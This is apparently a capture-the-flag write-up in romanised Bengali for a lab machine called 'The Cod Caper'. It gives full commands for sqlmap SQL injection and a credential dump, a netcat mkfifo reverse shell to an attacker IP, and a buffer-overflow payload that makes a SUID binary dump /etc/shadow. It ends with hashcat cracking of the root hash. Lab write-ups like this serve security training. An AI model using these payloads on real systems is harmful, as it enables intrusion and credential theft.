# CTF Writeup: The Cod Caper

Ei guide-e machine-ti exploit korar dhab-gulo bola hoyeche, ja apni apnar reference file "The Cod Caper.md" -e save kore rakhte paren. Ekhane SQL injection er maddhome initial access, reverse shell toiri, ebong buffer overflow o password cracking er maddhome privilege escalation er bishoygulo tule dhora hoyeche.

## 1. SQL Injection er maddhome Initial Access
Prothom dhabe ekti web request-e SQL injection vulnerability khuje ber kora hoy. Amra vulnerable HTTP request-ti `rootx` namer ekti file-e save kori ebong database enumeration er jonno `sqlmap` automate korte bebohar kori.

Prothome, available database-gulo khuje ber korte:
```bash
sqlmap -r rootx --dbs --batch
```

Erpor, `users` database theke data dump korte nicher command-ti chalano hoy:
```bash
sqlmap -r rootx -D users --dump --batch
```

Ete amra nicher valid credential-gulo successfully pai:
*   **Username:** `pingudad`
*   **Password:** `secretpass`

## 2. Shell paowa o Stabilization
Initial access paowar por, amra attacker machine-e connect korar jonno ekti reverse shell payload bebohar kori. Er jonno `mkfifo` payload use kora hoyeche:
```bash
mkfifo /tmp/lol;nc 192.168.152.214 4444 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

Shell-tike fully interactive o stable korar jonno Python bebohar kore TTY shell spawn kora hoy:
```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

Pashapashi, `pingu` user er maddhome SSH diye direct remote connection toiri kora hoy:
```bash
ssh pingu@10.65.155.101
```

## 3. Privilege Escalation
System-e privilege escalation er rasta khujhte giye amra ekti interesting SUID binary pai.
*   **Interesting SUID file path:** `/opt/secret/root`

Amra dekhte pai je ei binary-ti buffer overflow er kache vulnerable. 44-ti "A" character diye padding kore ebong memory address `\xcb\x84\x04\x08` (little-endian format-e) jukto kore amra program-er execution flow control korte pari. Jar fole program-ti force hoye `/etc/shadow` file-er contents dump kore dey:
```bash
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```

Ei output theke root user er SHA-512 crypt hash-ti extract kore amra `hash.txt` file-e save kori. Erpor Hashcat o `rockyou.txt` wordlist bebohar kore eti crack kora hoy. Faster cracking er jonno optimized kernel flag `-O` bebohar kora hoyeche:
```bash
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt -O
```

**Final Result:**
*   **Root Password:** `love2fish`

Ei password-ti bebohar kore amra successfully system-e sompurno root access peye jai.